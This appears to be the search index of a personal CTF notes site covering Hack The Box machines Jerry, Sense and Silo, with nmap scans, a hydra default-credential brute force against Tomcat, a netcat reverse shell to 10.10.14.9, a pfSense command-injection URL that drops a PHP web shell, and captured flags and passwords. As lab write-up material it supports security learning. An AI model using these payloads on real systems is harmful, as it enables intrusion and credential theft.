Applications"},{"location":"ctf/hack-the-box/irked/03_PostExploitation/InfoBreakdown/05_UsersGroups/","text":"","title":"05 UsersGroups"},{"location":"ctf/hack-the-box/irked/03_PostExploitation/InfoBreakdown/06_Network/","text":"","title":"06 Network"},{"location":"ctf/hack-the-box/irked/03_PostExploitation/InfoBreakdown/07_ScheduledJobs/","text":"","title":"07 ScheduledJobs"},{"location":"ctf/hack-the-box/irked/03_PostExploitation/ScriptResults/LinEnum/","text":"","title":"LinEnum"},{"location":"ctf/hack-the-box/jerry[ippsec-pending]/01_Enumeration/Network/","text":"TCP nmap -sV -sC -oA nmap --script safe -T4 10.10.10.95 Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-24 02:21 EDT Pre-scan script results: | broadcast-dhcp-discover: | Response 1 of 1: | IP Offered: 10.0.2.16 | Subnet Mask: 255.255.255.0 | Router: 10.0.2.2 | Domain Name Server: 10.0.2.3 |_ Server Identifier: 10.0.2.2 |_eap-info: please specify an interface with -e | targets-asn: |_ targets-asn.asn is a mandatory parameter Nmap scan report for 10.10.10.95 Host is up (0.23s latency). Not shown: 999 filtered ports PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 | http-auth-finder: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.95 | url method | http://10.10.10.95:8080/manager/status HTTP: Basic | http://10.10.10.95:8080/host-manager/html HTTP: Basic |_ http://10.10.10.95:8080/manager/html HTTP: Basic |_http-date: Wed, 24 Apr 2019 13:21:10 GMT; +6h58m31s from local time. |_http-favicon: Apache Tomcat |_http-fetch: Please enter the complete path of the directory to save data in. | http-grep: | (1) http://10.10.10.95:8080/docs/appdev/: | (1) email: |_ + craigmcc@apache.org | http-headers: | Server: Apache-Coyote/1.1 | Content-Type: text/html;charset=ISO-8859-1 | Transfer-Encoding: chunked | Date: Wed, 24 Apr 2019 13:21:12 GMT | Connection: close | |_ (Request type: HEAD) |_http-mobileversion-checker: No mobile version detected. |_http-referer-checker: Couldn't find any cross-domain scripts. |_http-security-headers: |_http-server-header: Apache-Coyote/1.1 |_http-title: Apache Tomcat/7.0.88 | http-useragent-tester: | Status for browser useragent: 200 | Allowed User Agents: | Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html) | libwww | lwp-trivial | libcurl-agent/1.0 | PHP/ | Python-urllib/2.5 | GT::WWW | Snoopy | MFC_Tear_Sample | HTTP::Lite | PHPCrawl | URI::Fetch | Zend_Http_Client | http client | PECL::HTTP | Wget/1.13.4 (linux-gnu) |_ WWW-Mechanize/1.34 |_http-xssed: No previously reported XSS vuln. Host script results: |_clock-skew: mean: 6h58m30s, deviation: 0s, median: 6h58m30s |_fcrdns: FAIL (No PTR record) |_ipidseq: Random Positive Increments |_path-mtu: PMTU == 1500 Post-scan script results: | reverse-index: |_ 8080/tcp: 10.10.10.95 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 233.82 seconds UDP","title":"Network"},{"location":"ctf/hack-the-box/jerry[ippsec-pending]/01_Enumeration/Network/#tcp","text":"nmap -sV -sC -oA nmap --script safe -T4 10.10.10.95 Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-24 02:21 EDT Pre-scan script results: | broadcast-dhcp-discover: | Response 1 of 1: | IP Offered: 10.0.2.16 | Subnet Mask: 255.255.255.0 | Router: 10.0.2.2 | Domain Name Server: 10.0.2.3 |_ Server Identifier: 10.0.2.2 |_eap-info: please specify an interface with -e | targets-asn: |_ targets-asn.asn is a mandatory parameter Nmap scan report for 10.10.10.95 Host is up (0.23s latency). Not shown: 999 filtered ports PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 | http-auth-finder: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.95 | url method | http://10.10.10.95:8080/manager/status HTTP: Basic | http://10.10.10.95:8080/host-manager/html HTTP: Basic |_ http://10.10.10.95:8080/manager/html HTTP: Basic |_http-date: Wed, 24 Apr 2019 13:21:10 GMT; +6h58m31s from local time. |_http-favicon: Apache Tomcat |_http-fetch: Please enter the complete path of the directory to save data in. | http-grep: | (1) http://10.10.10.95:8080/docs/appdev/: | (1) email: |_ + craigmcc@apache.org | http-headers: | Server: Apache-Coyote/1.1 | Content-Type: text/html;charset=ISO-8859-1 | Transfer-Encoding: chunked | Date: Wed, 24 Apr 2019 13:21:12 GMT | Connection: close | |_ (Request type: HEAD) |_http-mobileversion-checker: No mobile version detected. |_http-referer-checker: Couldn't find any cross-domain scripts. |_http-security-headers: |_http-server-header: Apache-Coyote/1.1 |_http-title: Apache Tomcat/7.0.88 | http-useragent-tester: | Status for browser useragent: 200 | Allowed User Agents: | Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html) | libwww | lwp-trivial | libcurl-agent/1.0 | PHP/ | Python-urllib/2.5 | GT::WWW | Snoopy | MFC_Tear_Sample | HTTP::Lite | PHPCrawl | URI::Fetch | Zend_Http_Client | http client | PECL::HTTP | Wget/1.13.4 (linux-gnu) |_ WWW-Mechanize/1.34 |_http-xssed: No previously reported XSS vuln. Host script results: |_clock-skew: mean: 6h58m30s, deviation: 0s, median: 6h58m30s |_fcrdns: FAIL (No PTR record) |_ipidseq: Random Positive Increments |_path-mtu: PMTU == 1500 Post-scan script results: | reverse-index: |_ 8080/tcp: 10.10.10.95 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 233.82 seconds","title":"TCP"},{"location":"ctf/hack-the-box/jerry[ippsec-pending]/01_Enumeration/Network/#udp","text":"","title":"UDP"},{"location":"ctf/hack-the-box/jerry[ippsec-pending]/01_Enumeration/WebServices/","text":"Tomcat hydra -C ~/HTB/tools/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt 10.10.10.95 http-get /manager/html -I -s 8080 Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-04-24 03:34:27 [WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 16 tasks per 1 server, overall 16 tasks, 79 login tries, ~5 tries per task [DATA] attacking http-get://10.10.10.95:8080/manager/html [8080][http-get] host: 10.10.10.95 login: admin password: admin [8080][http-get] host: 10.10.10.95 login: admin password: admin [8080][http-get] host: 10.10.10.95 login: tomcat password: s3cret 1 of 1 target successfully completed, 3 valid passwords found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-04-24 03:35:09 Nikto DirBuster / GoBuster SSL Cert WebDav CMS","title":"WebServices"},{"location":"ctf/hack-the-box/jerry[ippsec-pending]/01_Enumeration/WebServices/#tomcat","text":"hydra -C ~/HTB/tools/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt 10.10.10.95 http-get /manager/html -I -s 8080 Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-04-24 03:34:27 [WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 16 tasks per 1 server, overall 16 tasks, 79 login tries, ~5 tries per task [DATA] attacking http-get://10.10.10.95:8080/manager/html [8080][http-get] host: 10.10.10.95 login: admin password: admin [8080][http-get] host: 10.10.10.95 login: admin password: admin [8080][http-get] host: 10.10.10.95 login: tomcat password: s3cret 1 of 1 target successfully completed, 3 valid passwords found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-04-24 03:35:09","title":"Tomcat"},{"location":"ctf/hack-the-box/jerry[ippsec-pending]/01_Enumeration/WebServices/#nikto","text":"","title":"Nikto"},{"location":"ctf/hack-the-box/jerry[ippsec-pending]/01_Enumeration/WebServices/#dirbuster-gobuster","text":"","title":"DirBuster / GoBuster"},{"location":"ctf/hack-the-box/jerry[ippsec-pending]/01_Enumeration/WebServices/#ssl-cert","text":"","title":"SSL Cert"},{"location":"ctf/hack-the-box/jerry[ippsec-pending]/01_Enumeration/WebServices/#webdav","text":"","title":"WebDav"},{"location":"ctf/hack-the-box/jerry[ippsec-pending]/01_Enumeration/WebServices/#cms","text":"","title":"CMS"},{"location":"ctf/hack-the-box/jerry[ippsec-pending]/02_Exploitation/Tomcat/","text":"Upload jsbbrowser web shell Upload nc64.exe nc64.exe -e cmd.exe 10.10.14.9 4444","title":"Tomcat"},{"location":"ctf/hack-the-box/jerry[ippsec-pending]/03_PostExploitation/Goodies/","text":"Hashes Password Proof, Flags, Other C:\\Users\\Administrator\\Desktop\\flags type 2 for the price of 1.txt type 2 for the price of 1.txt user.txt 7004dbcef0f854e0fb401875f26ebd00 root.txt 04a8b36e1545a455393d067e772fe90e","title":"Goodies"},{"location":"ctf/hack-the-box/jerry[ippsec-pending]/03_PostExploitation/Goodies/#hashes","text":"","title":"Hashes"},{"location":"ctf/hack-the-box/jerry[ippsec-pending]/03_PostExploitation/Goodies/#password","text":"","title":"Password"},{"location":"ctf/hack-the-box/jerry[ippsec-pending]/03_PostExploitation/Goodies/#proof-flags-other","text":"C:\\Users\\Administrator\\Desktop\\flags type 2 for the price of 1.txt type 2 for the price of 1.txt user.txt 7004dbcef0f854e0fb401875f26ebd00 root.txt 04a8b36e1545a455393d067e772fe90e","title":"Proof, Flags, Other"},{"location":"ctf/hack-the-box/jerry[ippsec-pending]/03_PostExploitation/InfoBreakdown/01_Host/","text":"Host Name: JERRY OS Name: Microsoft Windows Server 2012 R2 Standard OS Version: 6.3.9600 N/A Build 9600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00252-00112-46014-AA570 Original Install Date: 6/18/2018, 11:30:45 PM System Boot Time: 4/22/2019, 3:24:41 PM System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 1 Processor(s) Installed. [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 7/28/2017 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: en-us;English (United States) Input Locale: en-us;English (United States) Time Zone: (UTC+02:00) Athens, Bucharest Total Physical Memory: 4,095 MB Available Physical Memory: 3,406 MB Virtual Memory: Max Size: 4,799 MB Virtual Memory: Available: 4,076 MB Virtual Memory: In Use: 723 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: N/A Hotfix(s): 142 Hotfix(s) Installed. [01]: KB2868626 [02]: KB2883200 [03]: KB2887595 [04]: KB2894856 [05]: KB2903939 [06]: KB2911106 [07]: KB2919355 [08]: KB2919394 [09]: KB2928680 [10]: KB2938066 [11]: KB2954879 [12]: KB2967917 [13]: KB2977765 [14]: KB2978041 [15]: KB2978126 [16]: KB2989930 [17]: KB3000850 [18]: KB3003057 [19]: KB3004365 [20]: KB3004545 [21]: KB3012235 [22]: KB3012702 [23]: KB3013172 [24]: KB3013531 [25]: KB3013538 [26]: KB3013769 [27]: KB3013791 [28]: KB3013816 [29]: KB3014442 [30]: KB3015696 [31]: KB3018133 [32]: KB3019978 [33]: KB3021910 [34]: KB3023222 [35]: KB3023266 [36]: KB3024751 [37]: KB3024755 [38]: KB3029603 [39]: KB3030947 [40]: KB3032663 [41]: KB3033446 [42]: KB3035126 [43]: KB3036612 [44]: KB3037579 [45]: KB3037924 [46]: KB3038002 [47]: KB3042085 [48]: KB3044374 [49]: KB3044673 [50]: KB3045634 [51]: KB3045685 [52]: KB3045717 [53]: KB3045719 [54]: KB3045755 [55]: KB3045999 [56]: KB3046017 [57]: KB3046737 [58]: KB3054169 [59]: KB3054203 [60]: KB3054256 [61]: KB3054464 [62]: KB3055323 [63]: KB3055343 [64]: KB3055642 [65]: KB3059317 [66]: KB3060681 [67]: KB3060793 [68]: KB3061512 [69]: KB3063843 [70]: KB3071756 [71]: KB3074228 [72]: KB3074548 [73]: KB3076949 [74]: KB3077715 [75]: KB3078405 [76]: KB3078676 [77]: KB3080149 [78]: KB3082089 [79]: KB3084135 [80]: KB3084905 [81]: KB3086255 [82]: KB3087041 [83]: KB3087137 [84]: KB3091297 [85]: KB3094486 [86]: KB3095701 [87]: KB3097997 [88]: KB3098779 [89]: KB3099834 [90]: KB3100473 [91]: KB3102429 [92]: KB3103616 [93]: KB3103696 [94]: KB3103709 [95]: KB3109103 [96]: KB3109560 [97]: KB3109976 [98]: KB3110329 [99]: KB3115224 [100]: KB3121261 [101]: KB3121461 [102]: KB3123245 [103]: KB3126434 [104]: KB3126587 [105]: KB3133043 [106]: KB3133690 [107]: KB3134179 [108]: KB3134815 [109]: KB3137728 [110]: KB3138378 [111]: KB3138602 [112]: KB3138910 [113]: KB3138962 [114]: KB3139164 [115]: KB3139398 [116]: KB3139914 [117]: KB3140219 [118]: KB3140234 [119]: KB3145384 [120]: KB3145432 [121]: KB3146604 [122]: KB3146723 [123]: KB3146751 [124]: KB3147071 [125]: KB3155784 [126]: KB3156059 [127]: KB3159398 [128]: KB3161949 [129]: KB3162343 [130]: KB3172614 [131]: KB3172729 [132]: KB3173424 [133]: KB3175024 [134]: KB3178539 [135]: KB3179574 [136]: KB3185319 [137]: KB4033369 [138]: KB4033428 [139]: KB4054854 [140]: KB4096417 [141]: KB4287903 [142]: KB4284815 Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) 82574L Gigabit Network Connection Connection Name: Ethernet0 DHCP Enabled: No IP address(es) [01]: 10.10.10.95 Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed.","title":"01 Host"},{"location":"ctf/hack-the-box/sense[ippsecpending]/Log/","text":"","title":"Log"},{"location":"ctf/hack-the-box/sense[ippsecpending]/01_Enumeration/Network/","text":"TCP Pre-scan script results: | broadcast-dhcp-discover: | Response 1 of 1: | IP Offered: 10.0.2.16 | Subnet Mask: 255.255.255.0 | Router: 10.0.2.2 | Domain Name Server: 10.0.2.3 |_ Server Identifier: 10.0.2.2 |_eap-info: please specify an interface with -e | targets-asn: |_ targets-asn.asn is a mandatory parameter Nmap scan report for 10.10.10.60 (10.10.10.60) Host is up (0.28s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 80/tcp open http lighttpd 1.4.35 |_http-comments-displayer: Couldn't find any comments. |_http-date: Fri, 26 Apr 2019 10:47:48 GMT; +20m49s from local time. |_http-fetch: Please enter the complete path of the directory to save data in. | http-headers: | Location: https://10.10.10.60/ | Content-Length: 0 | Connection: close | Date: Fri, 26 Apr 2019 10:47:59 GMT | Server: lighttpd/1.4.35 | |_ (Request type: GET) |_http-mobileversion-checker: No mobile version detected. |_http-referer-checker: Couldn't find any cross-domain scripts. |_http-security-headers: |_http-server-header: lighttpd/1.4.35 | http-slowloris-check: | VULNERABLE: | Slowloris DOS attack | State: LIKELY VULNERABLE | IDs: CVE:CVE-2007-6750 | Slowloris tries to keep many connections to the target web server open and hold | them open as long as possible. It accomplishes this by opening connections to | the target web server and sending a partial request. By doing so, it starves | the http server's resources causing Denial Of Service. | | Disclosure date: 2009-09-17 | References: | http://ha.ckers.org/slowloris/ |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 |_http-title: Did not follow redirect to https://10.10.10.60/ | http-useragent-tester: | Status for browser useragent: false | Redirected To: https://10.10.10.60/ | Allowed User Agents: | Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html) | libwww | lwp-trivial | libcurl-agent/1.0 | PHP/ | Python-urllib/2.5 | GT::WWW | Snoopy | MFC_Tear_Sample | HTTP::Lite | PHPCrawl | URI::Fetch | Zend_Http_Client | http client | PECL::HTTP | Wget/1.13.4 (linux-gnu) |_ WWW-Mechanize/1.34 |_http-xssed: No previously reported XSS vuln. 443/tcp open ssl/https? |_http-comments-displayer: Couldn't find any comments. |_http-fetch: Please enter the complete path of the directory to save data in. |_http-mobileversion-checker: No mobile version detected. |_http-referer-checker: Couldn't find any cross-domain scripts. | http-security-headers: | Strict_Transport_Security: |_ HSTS not configured in HTTPS Server | http-useragent-tester: | Allowed User Agents: | Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html) | libwww | lwp-trivial | libcurl-agent/1.0 | PHP/ | Python-urllib/2.5 | GT::WWW | Snoopy | MFC_Tear_Sample | HTTP::Lite | PHPCrawl | URI::Fetch | Zend_Http_Client | http client | PECL::HTTP | Wget/1.13.4 (linux-gnu) |_ WWW-Mechanize/1.34 |_http-xssed: No previously reported XSS vuln. | ssl-ccs-injection: | VULNERABLE: | SSL/TLS MITM vulnerability (CCS Injection) | State: VULNERABLE | Risk factor: High | OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h | does not properly restrict processing of ChangeCipherSpec messages, | which allows man-in-the-middle attackers to trigger use of a zero | length master key in certain OpenSSL-to-OpenSSL communications, and | consequently hijack sessions or obtain sensitive information, via | a crafted TLS handshake, aka the CCS Injection vulnerability. | | References: | http://www.cvedetails.com/cve/2014-0224 | http://www.openssl.org/news/secadv_20140605.txt |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224 |_ssl-date: TLS randomness does not represent time | ssl-dh-params: | VULNERABLE: | Diffie-Hellman Key Exchange Insufficient Group Strength | State: VULNERABLE | Transport Layer Security (TLS) services that use Diffie-Hellman groups | of insufficient strength, especially those using one of a few commonly | shared groups, may be susceptible to passive eavesdropping attacks. | Check results: | WEAK DH GROUP 1 | Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA | Modulus Type: Non-safe prime | Modulus Source: RFC5114/1024-bit DSA group with 160-bit prime order subgroup | Modulus Length: 1024 | Generator Length: 1024 | Public Key Length: 1024 | References: |_ https://weakdh.org | ssl-poodle: | VULNERABLE: | SSL POODLE information leak | State: VULNERABLE | IDs: CVE:CVE-2014-3566 OSVDB:113251 | The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other | products, uses nondeterministic CBC padding, which makes it easier | for man-in-the-middle attackers to obtain cleartext data via a | padding-oracle attack, aka the POODLE issue. | Disclosure date: 2014-10-14 | Check results: | TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA | References: | https://www.openssl.org/~bodo/ssl-poodle.pdf | http://osvdb.org/113251 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566 |_ https://www.imperialviolet.org/2014/10/14/poodle.html Host script results: |_clock-skew: mean: 20m48s, deviation: 0s, median: 20m48s | dns-blacklist: | PROXY | http.dnsbl.sorbs.net - FAIL |_ tor.dan.me.uk - FAIL |_fcrdns: FAIL (No A record) |_ipidseq: Randomized |_path-mtu: PMTU == 1500 | qscan: | PORT FAMILY MEAN (us) STDDEV LOSS (%) | 80 0 276805.67 43071.59 10.0% |_443 0 274113.20 42161.88 0.0% Post-scan script results: | reverse-index: | 80/tcp: 10.10.10.60 |_ 443/tcp: 10.10.10.60 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 413.68 seconds root@kali:~/HTB/sense# UDP","title":"Network"},{"location":"ctf/hack-the-box/sense[ippsecpending]/01_Enumeration/Network/#tcp","text":"Pre-scan script results: | broadcast-dhcp-discover: | Response 1 of 1: | IP Offered: 10.0.2.16 | Subnet Mask: 255.255.255.0 | Router: 10.0.2.2 | Domain Name Server: 10.0.2.3 |_ Server Identifier: 10.0.2.2 |_eap-info: please specify an interface with -e | targets-asn: |_ targets-asn.asn is a mandatory parameter Nmap scan report for 10.10.10.60 (10.10.10.60) Host is up (0.28s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 80/tcp open http lighttpd 1.4.35 |_http-comments-displayer: Couldn't find any comments. |_http-date: Fri, 26 Apr 2019 10:47:48 GMT; +20m49s from local time. |_http-fetch: Please enter the complete path of the directory to save data in. | http-headers: | Location: https://10.10.10.60/ | Content-Length: 0 | Connection: close | Date: Fri, 26 Apr 2019 10:47:59 GMT | Server: lighttpd/1.4.35 | |_ (Request type: GET) |_http-mobileversion-checker: No mobile version detected. |_http-referer-checker: Couldn't find any cross-domain scripts. |_http-security-headers: |_http-server-header: lighttpd/1.4.35 | http-slowloris-check: | VULNERABLE: | Slowloris DOS attack | State: LIKELY VULNERABLE | IDs: CVE:CVE-2007-6750 | Slowloris tries to keep many connections to the target web server open and hold | them open as long as possible. It accomplishes this by opening connections to | the target web server and sending a partial request. By doing so, it starves | the http server's resources causing Denial Of Service. | | Disclosure date: 2009-09-17 | References: | http://ha.ckers.org/slowloris/ |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 |_http-title: Did not follow redirect to https://10.10.10.60/ | http-useragent-tester: | Status for browser useragent: false | Redirected To: https://10.10.10.60/ | Allowed User Agents: | Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html) | libwww | lwp-trivial | libcurl-agent/1.0 | PHP/ | Python-urllib/2.5 | GT::WWW | Snoopy | MFC_Tear_Sample | HTTP::Lite | PHPCrawl | URI::Fetch | Zend_Http_Client | http client | PECL::HTTP | Wget/1.13.4 (linux-gnu) |_ WWW-Mechanize/1.34 |_http-xssed: No previously reported XSS vuln. 443/tcp open ssl/https? |_http-comments-displayer: Couldn't find any comments. |_http-fetch: Please enter the complete path of the directory to save data in. |_http-mobileversion-checker: No mobile version detected. |_http-referer-checker: Couldn't find any cross-domain scripts. | http-security-headers: | Strict_Transport_Security: |_ HSTS not configured in HTTPS Server | http-useragent-tester: | Allowed User Agents: | Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html) | libwww | lwp-trivial | libcurl-agent/1.0 | PHP/ | Python-urllib/2.5 | GT::WWW | Snoopy | MFC_Tear_Sample | HTTP::Lite | PHPCrawl | URI::Fetch | Zend_Http_Client | http client | PECL::HTTP | Wget/1.13.4 (linux-gnu) |_ WWW-Mechanize/1.34 |_http-xssed: No previously reported XSS vuln. | ssl-ccs-injection: | VULNERABLE: | SSL/TLS MITM vulnerability (CCS Injection) | State: VULNERABLE | Risk factor: High | OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h | does not properly restrict processing of ChangeCipherSpec messages, | which allows man-in-the-middle attackers to trigger use of a zero | length master key in certain OpenSSL-to-OpenSSL communications, and | consequently hijack sessions or obtain sensitive information, via | a crafted TLS handshake, aka the CCS Injection vulnerability. | | References: | http://www.cvedetails.com/cve/2014-0224 | http://www.openssl.org/news/secadv_20140605.txt |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224 |_ssl-date: TLS randomness does not represent time | ssl-dh-params: | VULNERABLE: | Diffie-Hellman Key Exchange Insufficient Group Strength | State: VULNERABLE | Transport Layer Security (TLS) services that use Diffie-Hellman groups | of insufficient strength, especially those using one of a few commonly | shared groups, may be susceptible to passive eavesdropping attacks. | Check results: | WEAK DH GROUP 1 | Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA | Modulus Type: Non-safe prime | Modulus Source: RFC5114/1024-bit DSA group with 160-bit prime order subgroup | Modulus Length: 1024 | Generator Length: 1024 | Public Key Length: 1024 | References: |_ https://weakdh.org | ssl-poodle: | VULNERABLE: | SSL POODLE information leak | State: VULNERABLE | IDs: CVE:CVE-2014-3566 OSVDB:113251 | The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other | products, uses nondeterministic CBC padding, which makes it easier | for man-in-the-middle attackers to obtain cleartext data via a | padding-oracle attack, aka the POODLE issue. | Disclosure date: 2014-10-14 | Check results: | TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA | References: | https://www.openssl.org/~bodo/ssl-poodle.pdf | http://osvdb.org/113251 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566 |_ https://www.imperialviolet.org/2014/10/14/poodle.html Host script results: |_clock-skew: mean: 20m48s, deviation: 0s, median: 20m48s | dns-blacklist: | PROXY | http.dnsbl.sorbs.net - FAIL |_ tor.dan.me.uk - FAIL |_fcrdns: FAIL (No A record) |_ipidseq: Randomized |_path-mtu: PMTU == 1500 | qscan: | PORT FAMILY MEAN (us) STDDEV LOSS (%) | 80 0 276805.67 43071.59 10.0% |_443 0 274113.20 42161.88 0.0% Post-scan script results: | reverse-index: | 80/tcp: 10.10.10.60 |_ 443/tcp: 10.10.10.60 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 413.68 seconds root@kali:~/HTB/sense#","title":"TCP"},{"location":"ctf/hack-the-box/sense[ippsecpending]/01_Enumeration/Network/#udp","text":"","title":"UDP"},{"location":"ctf/hack-the-box/sense[ippsecpending]/01_Enumeration/OtherServices/","text":"SMB SNMP SMTP Databases Other","title":"OtherServices"},{"location":"ctf/hack-the-box/sense[ippsecpending]/01_Enumeration/OtherServices/#smb","text":"","title":"SMB"},{"location":"ctf/hack-the-box/sense[ippsecpending]/01_Enumeration/OtherServices/#snmp","text":"","title":"SNMP"},{"location":"ctf/hack-the-box/sense[ippsecpending]/01_Enumeration/OtherServices/#smtp","text":"","title":"SMTP"},{"location":"ctf/hack-the-box/sense[ippsecpending]/01_Enumeration/OtherServices/#databases","text":"","title":"Databases"},{"location":"ctf/hack-the-box/sense[ippsecpending]/01_Enumeration/OtherServices/#other","text":"","title":"Other"},{"location":"ctf/hack-the-box/sense[ippsecpending]/01_Enumeration/WebServices/","text":"Nikto DirBuster / GoBuster changelog.txt system-users.txt ####Support ticket### Please create the following user username: Rohit password: company defaults SSL Cert WebDav CMS","title":"WebServices"},{"location":"ctf/hack-the-box/sense[ippsecpending]/01_Enumeration/WebServices/#nikto","text":"","title":"Nikto"},{"location":"ctf/hack-the-box/sense[ippsecpending]/01_Enumeration/WebServices/#dirbuster-gobuster","text":"changelog.txt system-users.txt ####Support ticket### Please create the following user username: Rohit password: company defaults","title":"DirBuster / GoBuster"},{"location":"ctf/hack-the-box/sense[ippsecpending]/01_Enumeration/WebServices/#ssl-cert","text":"","title":"SSL Cert"},{"location":"ctf/hack-the-box/sense[ippsecpending]/01_Enumeration/WebServices/#webdav","text":"","title":"WebDav"},{"location":"ctf/hack-the-box/sense[ippsecpending]/01_Enumeration/WebServices/#cms","text":"","title":"CMS"},{"location":"ctf/hack-the-box/sense[ippsecpending]/02_Exploitation/pfsense/","text":"https://www.exploit-db.com/exploits/43560 https://10.10.10.60/status_rrd_graph_img.php?database=queues;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd usr;cd local; cd www;echo 'test' abcd.txt https://10.10.10.60/status_rrd_graph_img.php?database=queues;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd usr;cd local; cd www;echo ' ?php echo system($_GET[ cmd ]); ? ' abcd.php Can also do: php eval(base64_decode('ZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsg'));? echo system($_GET['cmd']);","title":"Pfsense"},{"location":"ctf/hack-the-box/sense[ippsecpending]/03_PostExploitation/Goodies/","text":"Hashes Password https://10.10.10.60/index.php rohit:pfsense Proof, Flags, Other","title":"Goodies"},{"location":"ctf/hack-the-box/sense[ippsecpending]/03_PostExploitation/Goodies/#hashes","text":"","title":"Hashes"},{"location":"ctf/hack-the-box/sense[ippsecpending]/03_PostExploitation/Goodies/#password","text":"https://10.10.10.60/index.php rohit:pfsense","title":"Password"},{"location":"ctf/hack-the-box/sense[ippsecpending]/03_PostExploitation/Goodies/#proof-flags-other","text":"","title":"Proof, Flags, Other"},{"location":"ctf/hack-the-box/sense[ippsecpending]/03_PostExploitation/InfoBreakdown/01_Host/","text":"","title":"01 Host"},{"location":"ctf/hack-the-box/sense[ippsecpending]/03_PostExploitation/InfoBreakdown/02_FileSystem/","text":"","title":"02 FileSystem"},{"location":"ctf/hack-the-box/sense[ippsecpending]/03_PostExploitation/InfoBreakdown/03_Processes/","text":"","title":"03 Processes"},{"location":"ctf/hack-the-box/sense[ippsecpending]/03_PostExploitation/InfoBreakdown/04_Applications/","text":"","title":"04 Applications"},{"location":"ctf/hack-the-box/sense[ippsecpending]/03_PostExploitation/InfoBreakdown/05_UsersGroups/","text":"","title":"05 UsersGroups"},{"location":"ctf/hack-the-box/sense[ippsecpending]/03_PostExploitation/InfoBreakdown/06_Network/","text":"","title":"06 Network"},{"location":"ctf/hack-the-box/sense[ippsecpending]/03_PostExploitation/InfoBreakdown/07_ScheduledJobs/","text":"","title":"07 ScheduledJobs"},{"location":"ctf/hack-the-box/sense[ippsecpending]/03_PostExploitation/ScriptResults/LinEnum/","text":"","title":"LinEnum"},{"location":"ctf/hack-the-box/silo[ippsecpending]/Log/","text":"","title":"Log"},{"location":"ctf/hack-the-box/silo[ippsecpending]/01_Enumeration/Network/","text":"TCP # Nmap 7.70 scan initiated Wed Apr 24 07:09:09 2019 as: nmap -sV -sC -oA nmap --script safe -T4 10.10.10.82 Pre-scan script results: | broadcast-dhcp-discover: | Response 1 of 1: | IP Offered: 10.0.2.16 | Subnet Mask: 255.255.255.0 | Router: 10.0.2.2 | Domain Name Server: 10.0.2.3 |_ Server Identifier: 10.0.2.2 |_eap-info: please specify an interface with -e | targets-asn: |_ targets-asn.asn is a mandatory parameter Nmap scan report for 10.10.10.82 (10.10.10.82) Host is up (0.15s latency). Not shown: 988 closed ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8.5 | http-comments-displayer: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.82 | | Path: http://10.10.10.82:80/ | Line number: 7 